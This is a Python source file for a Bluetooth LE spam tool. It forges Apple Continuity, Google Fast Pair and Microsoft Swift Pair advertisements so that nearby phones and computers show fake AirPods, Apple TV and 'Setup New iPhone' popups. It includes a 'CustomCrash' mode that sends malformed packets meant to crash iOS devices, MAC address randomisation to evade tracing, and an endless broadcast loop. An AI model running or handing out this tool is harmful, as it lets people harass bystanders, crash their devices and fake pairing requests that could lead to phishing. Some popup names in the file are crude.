# Author: ECTO-1A & SAY-10
# Github: https://github.com/ECTO-1A

# Based on the previous work of chipik / _hexway
from dataclasses import dataclass
from pprint import pprint
import random
import argparse
from time import sleep
from enum import Enum, auto
from typing import Sequence

import bluetooth._bluetooth as bluez

from utils.bluetooth_utils import change_internal_mac_addr, get_internal_mac_addr, toggle_device, start_le_advertising, stop_le_advertising
from utils.fast_pair_models import all_fp_models

# Add a docstring to describe the purpose of the script
help_desc = '''

Apple Proximity Pairing Notification Spoofing

---ECTO-1A August 2023---

Based on the previous work of chipik / _hexway

'''

# Define different bt_data options and their corresponding descriptions
bt_data_options = {
    1:  "AirPods",
    2:  "AirPods Pro",
    3:  "AirPods Max",
    4:  "AirPods 2nd Gen",
    5:  "AirPods 3rd Gen",
    6:  "AirPods Pro 2nd Gen",
    7:  "PowerBeats 3",
    8:  "PowerBeats Pro",
    9:  "Beats Solo Pro",
    10: "Beats Studio Buds",
    11: "Beats Flex",
    12: "Beats X",
    13: "Beats Solo 3",
    14: "Beats Studio 3",
    15: "Beats Studio Pro",
    16: "Beats Fit Pro",
    17: "Beats Studio Buds+",

    18: "AppleTV Setup",  # no picture
    19: "AppleTV Pair",  # no picture
    20: "AppleTV Join This AppleTV",
    21: "AppleTV AppleID Setup",
    22: "AppleTV Wireless Audio Sync",
    23: "AppleTV HomeKit Setup",
    24: "AppleTV Keyboard",
    25: "AppleTV Connecting...",
    26: "AppleTV Color Balance",
    27: "HomePod Setup",
    28: "Setup New iPhone",
    29: "Transfer Phone Number",

    # Add more options as needed (don't forget to review get_bt_data function below)
}

class ContinuityType(Enum):
    AirDrop = 0x05
    ProximityPair = 0x07
    AirplayTarget = 0x09
    Handoff = 0x0C
    TetheringSource = 0x0E
    NearbyAction = 0x0F
    NearbyInfo = 0x10

    CustomCrash = auto()
    COUNT = auto()

HEADER_LEN = 6  # 1 Size + 1 AD Type + 2 Company ID + 1 Continuity Type + 1 Continuity Size

packet_sizes = {
    ContinuityType.AirDrop: HEADER_LEN + 18,
    ContinuityType.ProximityPair: HEADER_LEN + 25,
    ContinuityType.AirplayTarget: HEADER_LEN + 6,
    ContinuityType.Handoff: HEADER_LEN + 14,
    ContinuityType.TetheringSource: HEADER_LEN + 6,
    ContinuityType.NearbyAction: HEADER_LEN + 5,
    ContinuityType.NearbyInfo: HEADER_LEN + 5,
    ContinuityType.CustomCrash: HEADER_LEN + 11,
}

pp_models = {
    "AirPods": 0x0220,
    "AirPods Pro": 0x0E20,
    "AirPods Max": 0x0A20,
    "AirPods 2nd Gen": 0x0F20,
    "AirPods 3rd Gen": 0x1320,
    "AirPods Pro 2nd Gen": 0x1420,
    "PowerBeats 3": 0x0320,
    "PowerBeats Pro": 0x0B20,
    "Beats Solo Pro": 0x0C20,
    "Beats Studio Buds": 0x1120,
    "Beats Flex": 0x1020,
    "Beats X": 0x0520,
    "Beats Solo 3": 0x0620,
    "Beats Studio 3": 0x0920,
    "Beats Studio Pro": 0x1720,
    "Beats Fit Pro": 0x1220,
    "Beats Studio Buds+": 0x1620,

    "Airtag": 0x0055,
    "Hermes Airtag": 0x0030,
}

na_actions = {
    "AppleTV Setup": 0x01,
    "AppleTV Pair": 0x06,
    "AppleTV Keyboard": 0x13,
    "AppleTV Connecting...": 0x27,
    "AppleTV Join This AppleTV": 0x20,
    "AppleTV Wireless Audio Sync": 0x19,  # 0xc0
    "AppleTV Color Balance": 0x1E,
    "AppleTV AppleID Setup": 0x2B,
    "AppleTV HomeKit Setup": 0x0D,
    "HomePod Setup": 0x0B,
    "Setup New iPhone": 0x09,
    "Transfer Phone Number": 0x02,
}

# Hex data map
hex_data = {
    1:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    2:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    3:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    4:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    5:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    6:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    7:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    8:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    9:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    10: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    11: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    12: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    13: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    14: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    15: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    16: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    17: (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
    18: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    19: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    20: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    21: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    22: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    23: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    24: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    25: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    26: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    27: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    28: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),
    29: (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00),

    # Add more as needed (don't forget to review get_bt_data function below)
}


def make_packet_apple(packet_type: ContinuityType, *, model: int = 0, action: int = 0) -> tuple[Sequence[int], int]:
    if model == 0:
        model = random.choice(list(pp_models.values()))
    if action == 0:
        action = random.choice(list(na_actions.values()))
    size = packet_sizes[packet_type]
    packet = [0] * size
    i = 0
    packet[i] = size - 1  # Size
    i+=1
    packet[i] = 0xFF  # AD Type (Manufacturer Specific)
    i+=1
    packet[i] = 0x4C  # Company ID (Apple, Inc.)
    i+=1
    packet[i] = 0x00  # ...
    i+=1
    packet[i] = packet_type.value  # Continuity Type
    i+=1
    packet[i] = size - i - 1  # Continuity Size
    i+=1
    match packet_type:
        case ContinuityType.ProximityPair:
            packet[i] = 0x07  # Prefix (paired 0x01 new 0x07 airtag 0x05)
            i += 1
            packet[i] = (model >> 0x08) & 0xFF
            i += 1
            packet[i] = (model >> 0x00) & 0xFF
            i += 1
            packet[i] = 0x55  # Status
            i += 1  # TODO why 0x55 not 0x75 ?
            packet[i] = random.randint(0, 99)  #  Buds Battery Level
            i += 1
            packet[i] = random.randint(0, 79)  # Charging Status and Battery Case Level
            i += 1
            packet[i] = random.randint(0, 255)  # Lid Open Counter
            i += 1
            packet[i:i+16] = [random.randint(0, 255) for _ in range(16)]  # Encrypted Payload
            i += 16
            return packet, size
        case ContinuityType.NearbyAction:
            flags = 0xC0
            if action == 0x20 and random.randint(0, 1):
                flags -= 1  # More spam for 'Join This AppleTV?'
            if action == 0x09 and random.randint(0, 1):
                flags = 0x40  # Glitched 'Setup New Device'

            packet[i] = flags
            i += 1
            packet[i] = action
            i += 1
            packet[i:i+3] = [random.randint(0, 255) for _ in range(3)]  # Authentication Tag
            i += 3
            return packet, size
        case ContinuityType.CustomCrash:
            # Found by @ECTO-1A

            action = random.choice(list(na_actions.values()))
            flags = 0xC0
            if action == 0x20 and random.randint(0, 1):
                flags -= 1  # More spam for 'Join This AppleTV?'
            if action == 0x09 and random.randint(0, 1):
                flags = 0x40  # Glitched 'Setup New Device'

            i -= 2  # Override segment header
            packet[i] = ContinuityType.NearbyAction.value  # Continuity Type
            i += 1
            packet[i] = 0x05  # Continuity Size
            i += 1
            packet[i] = flags
            i += 1
            packet[i] = action
            i += 1
            packet[i:i+3] = [random.randint(0, 255) for _ in range(3)]  # Authentication Tag
            i += 3

            packet[i] = 0x00  # Terminator (?)
            i += 1
            packet[i] = 0x00  # ...
            i += 1

            packet[i] = ContinuityType.NearbyInfo.value  # Continuity Type (?)
            i += 1
            packet[i:i+3] = [random.randint(0, 255) for _ in range(3)]  # Continuity Size (?) + Shenanigans (???)
            i += 3
            return packet, size
    raise NotImplementedError()


def make_packet_android(*, model: int = 0) -> tuple[Sequence[int], int]:
    if model == 0:
        model_name = random.choice(list(all_fp_models))
        model = all_fp_models[model_name]
        if isinstance(model, list):
            model = random.choice(model)
    size = 14
    packet = [0] * size
    i = 0

    packet[i] = 3  # Size
    i += 1
    packet[i] = 0x03  # AD Type (Service UUID List)
    i += 1
    packet[i] = 0x2C  # Service UUID (Google LLC, FastPair)
    i += 1
    packet[i] = 0xFE  # ...
    i += 1

    packet[i] = 6  # Size
    i += 1
    packet[i] = 0x16  # AD Type (Service Data)
    i += 1
    packet[i] = 0x2C  # Service UUID (Google LLC, FastPair)
    i += 1
    packet[i] = 0xFE  # ...
    i += 1
    packet[i] = (model >> 0x10) & 0xFF
    i += 1
    packet[i] = (model >> 0x08) & 0xFF
    i += 1
    packet[i] = (model >> 0x00) & 0xFF
    i += 1

    packet[i] = 2  # Size
    i += 1
    packet[i] = 0x0A  # AD Type (Tx Power Level)
    i += 1

    dbm = random.randint(-100, 19)
    if dbm < 0:
        dbm += 256
    packet[i] = dbm # -100 to +20 dBm
    i += 1
    return packet, size

sp_names = [
    "Assquach💦",
    "Flipper 🐬",
    "iOS 17 🍎",
    "Kink💦",
    "👉👌",
    "🔵🦷",
    '"Hack the planet"',
    '"Hack the plane',
]

class SwiftPairType(Enum):
    BLEOnly = 0x00
    BREDROnly = 0x01
    BLEAndBREDR = 0x02

def make_packet_windows(packet_type: SwiftPairType = SwiftPairType.BREDROnly, *, name: str = "") -> tuple[Sequence[int], int]:
    if not name:
        try:
            with open("names.txt", encoding="utf-8") as f:
                names = f.read().splitlines()
        except FileNotFoundError:
            names = sp_names
        name = random.choice(names)
    name_bytes = name.encode("utf-8")
    size = 7 + len(name_bytes)
    size += 3 if packet_type != SwiftPairType.BLEOnly else 0
    size += 6 if packet_type == SwiftPairType.BREDROnly else 0
    packet = [0] * size
    i = 0

    packet[i] = size -1  # Size
    i += 1
    packet[i] = 0xFF  # AD Type (Manufacturer Specific)
    i += 1
    packet[i] = 0x06  # Company ID (Microsoft)
    i += 1
    packet[i] = 0x00  # ...
    i += 1
    packet[i] = 0x03  # Microsoft Beacon ID
    i += 1
    packet[i] = packet_type.value  # Microsoft Beacon Sub Scenario
    i += 1
    packet[i] = 0x80  # Reserved RSSI Byte
    i += 1

    if packet_type == SwiftPairType.BREDROnly:
        packet[i:i+6] = [random.randint(0, 255) for _ in range(6)]  # BREDR MAC Address
        i += 6

    if packet_type != SwiftPairType.BLEOnly:
        # https://www.bluetooth.com/specifications/assigned-numbers/
        class_of_device = "0b00000000001"
        class_of_device += "00101"
        class_of_device += "01"
        class_of_device += "0000"
        class_of_device += "00"
        packet[i:i+3] = int(class_of_device, 2).to_bytes(3, "big")
        i += 3

    packet[i:i+len(name_bytes)] = name_bytes  # Add name bytes
    i += len(name_bytes)
    return packet, size


def make_proximity_pair_data(device_name: str) -> Sequence[int]:
    model = pp_models[device_name]
    packet, size = make_packet_apple(ContinuityType.ProximityPair, model=model)
    return packet


def make_nearby_action_data(name: str) -> Sequence[int]:
    model = na_actions[name]
    packet, size = make_packet_apple(ContinuityType.NearbyAction, model=model)
    return packet


def make_custom_crash_data() -> Sequence[int]:
    packet, size = make_packet_apple(ContinuityType.CustomCrash)
    return packet


# def print_tuple(seq: Sequence[int]) -> str:
#     return "(" + (', '.join([f"0x{c:02X}" for c in seq])) + ")"
# print(*[print_tuple(make_nearby_action_data(i)) + "\n" + print_tuple(hex_data[i]) for i in range(18,30)], sep="\n")
# print(*[print_tuple(make_packet_windows(name=i)[0]) + "\n" + i for i in sp_names], sep="\n")
# exit()


def make_apple_data(option: int) -> Sequence[int] | None:
    bt_data = hex_data.get(option)

    if not bt_data:
        return
    name = bt_data_options[option]
    if "AirPods" not in name and "Beats" not in name:
        return bt_data

    return make_proximity_pair_data(name)


class SpamTarget(Enum):
    random = auto()  # All except CustomCrash and Windows (WIP)
    IOS = auto()
    Android = auto()
    Windows = auto()
    IOSCustomCrash = auto()


@dataclass
class AttackPattern():
    dev_id: int
    interval: int
    adv_time: float
    random_mac: bool
    random_adv: bool
    spam_data: list
    spam_target: SpamTarget
    permanent: bool


def start_spam(sock, *, pattern: AttackPattern) -> None:
    spam_data = random.choice(pattern.spam_data) if pattern.spam_data else ""
    match pattern.spam_target:
        case SpamTarget.random:
            pattern.spam_target = random.choice(
                [
                    SpamTarget.IOS,
                    SpamTarget.Android,
                ]
            )
            return start_spam(sock, pattern=pattern)
        case SpamTarget.IOS:
            if spam_data:
                if spam_data.isalnum():
                    selected_option = int(spam_data)
                    if not 1 <= selected_option <= len(bt_data_options):
                        message = (
                            "Invalid data option: {selected_option}"
                            + "\nAvailable data options:"
                        )
                        for option, description in bt_data_options.items():
                            message += f"\n{option}: {description}"
                        raise ValueError(message)
                else:
                    try:
                        selected_option = list(bt_data_options.keys())[
                            [
                                _.lower() for _ in bt_data_options.values()
                            ].index(spam_data.lower())
                        ]
                    except ValueError as e:
                        message = (
                            f"Invalid device name: {spam_data}"
                            + "\nAvailable device names:"
                        )
                        for device_name in bt_data_options.values():
                            message += f"\n{device_name}"
                        raise ValueError(message) from e
            else:
                selected_option = random.choice(list(bt_data_options.keys()))
            bt_data = make_apple_data(selected_option)
        case SpamTarget.Android:
            bt_data, *_ = make_packet_android(model=(int(spam_data, 16) if spam_data.isalnum() else 0))
        case SpamTarget.Windows:
            bt_data, *_ = make_packet_windows(name=spam_data)
        case SpamTarget.IOSCustomCrash:
            bt_data = make_custom_crash_data()
        case _:
            return

    if pattern.random_mac:
        random_mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])

        # TODO check if specific mac matter
        if pattern.spam_target in [SpamTarget.Android, SpamTarget.Windows ]:
            random_mac = f"d4:3a:2c:{random_mac[9:]}"  # google mac prefix

        change_internal_mac_addr(sock, random_mac)

    # TODO check if 0x01, 0x02, 0x04 are valid ones (especially 0x01 and 0x04)
    # ADV_IND = 0x00
    # ADV_DIRECT_IND = 0x01
    # ADV_SCAN_IND = 0x02
    # ADV_NONCONN_IND = 0x03
    # ADV_SCAN_RSP = 0x04
    # adv_type = args.random_adv and random.randint(0x01,0x04) or 0x03
    adv_type = pattern.random_adv and random.randint(0x02,0x03) or 0x03

    start_le_advertising(sock, adv_type=adv_type, min_interval=pattern.interval, max_interval=pattern.interval, data=bt_data)
    while True:
        sleep(pattern.adv_time)
        if not pattern.permanent:
            break
    stop_le_advertising(sock)


def main():
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval (default 200))')
    parser.add_argument('-t', '--adv-time', default=2.0, type=float, help='Advertising time (default 2))')
    parser.add_argument('-b', '--bt-dev-id', default=0, type=int, help='Bluetooth device ID (default 0)')
    parser.add_argument('-d', '--data', type=str,
                        help='Select a message or device name to send (e.g., \'-d 1\' or \'-d "AirPods Pro"\') (can be splitted by , for multiple)')

    # Behavior
    parser.add_argument('-r', '--random', action='store_true', help='Randomly loop through advertising data (default) (also, forces random mac (random adv is WIP)))')
    parser.add_argument('--repeat', action='store_true', help='Infinitely repeat specified advertising data, without re-enabling')

    # Targets
    parser.add_argument('-c', '--custom-crash', action='store_true', help='Use custom crash method by @ECTO-1A')
    parser.add_argument('-ap', '--apple', action='store_true', help='Apple BLE spam')
    parser.add_argument('-an', '--android', action='store_true', help='Android BLE spam')
    parser.add_argument('-w', '--windows', action='store_true', help='Windows BLE spam')

    # Randomization
    parser.add_argument('--random-mac', action='store_true', help='Randomly select mac address')
    parser.add_argument('--random-adv', action='store_true', help='Randomly select advertisement event types')

    args = parser.parse_args()

    spam_target = (
        SpamTarget.IOS if args.apple else
        SpamTarget.Android if args.android else
        SpamTarget.Windows if args.windows else
        SpamTarget.IOSCustomCrash if args.custom_crash else
        SpamTarget.random)
    attack_pattern = AttackPattern(
        dev_id=args.bt_dev_id,
        interval=args.interval,
        adv_time=args.adv_time,
        random_mac=True if SpamTarget.random else args.random_mac,
        random_adv=args.random_adv,
        spam_data=args.data.split(",") if args.data else [],
        spam_target=spam_target,
        permanent=args.repeat,
        # permanent=hasattr(args, "data"),  # TODO
    )
    pprint(attack_pattern)

    # the default Bluetooth device is hci0
    toggle_device(attack_pattern.dev_id, True)

    try:
        sock = bluez.hci_open_dev(attack_pattern.dev_id)
        if args.random or args.random_mac:
            original_mac = get_internal_mac_addr(attack_pattern.dev_id)
            print(f"Your original mac address is {original_mac}\nIt will restored after you stop the script\n")
    except Exception as e:
        print(f"Unable to connect to Bluetooth hardware {attack_pattern.dev_id}: {e}")
        return

    print("Advertising Started... Press Ctrl+C to Stop")

    try:
        while True:
            start_spam(sock, pattern=attack_pattern)
    except KeyboardInterrupt:
        stop_le_advertising(sock)
    except Exception as e:
        print(f"An error occurred: {e}")
        stop_le_advertising(sock)
    if args.random_mac:
        print(f"Restoring original mac address {original_mac}...")  # type: ignore
        change_internal_mac_addr(sock, original_mac)  # type: ignore

if __name__ == "__main__":
    main()
